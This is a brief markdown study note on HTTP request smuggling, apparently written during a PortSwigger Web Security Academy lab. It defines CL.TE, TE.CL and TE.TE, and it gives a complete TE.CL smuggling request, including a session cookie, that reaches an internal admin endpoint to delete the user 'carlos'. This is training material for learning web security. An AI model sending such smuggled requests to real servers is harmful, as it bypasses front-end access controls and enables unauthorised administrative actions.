# Headers
<b>Content-Length: ? </b> <br>
<b>Transfer-Encoding: chunked </b> <br><br>
*Transfer-Encoding overrides the content-length header

# CL.TE 
the front-end server uses the Content-Length header and the back-end server uses the Transfer-Encoding header. <br>

### Explain CL.TE
```


```

# TE.CL
the front-end server uses the Transfer-Encoding header and the back-end server uses the Content-Length header. <br>

```
POST / HTTP/1.1
Host: 0aaf008204ba0912c0851b3c00490041.web-security-academy.net
Cookie: session=eqTNaJFL2vtKPO6k9w4ClcPKcPVmF8IR
Content-Length: 4 -> Disable burp suite auto content-length
Transfer-Encoding: chunked

87 
GET /admin/delete?username=carlos HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0
```


# TE.TE 
the front-end and back-end servers both support the Transfer-Encoding header, but one of the servers can be induced not to process it by obfuscating the header in some way. <br>


[video](https://www.youtube.com/watch?v=XdbSYNhRszE&ab_channel=CyberSecurityTV)
